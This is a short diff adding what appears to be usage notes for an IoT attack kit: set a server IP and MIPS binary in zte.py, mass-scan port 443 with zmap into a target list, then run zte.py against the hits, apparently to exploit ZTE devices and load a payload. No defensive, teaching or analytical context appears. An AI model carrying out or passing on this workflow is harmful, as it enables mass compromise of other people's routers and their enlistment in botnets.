@@ -1,0 +1,4 @@
+edit zte.py with server ip and mips
+zmap -p 443 -o zte -w zte.lst
+python zte.py zte
+
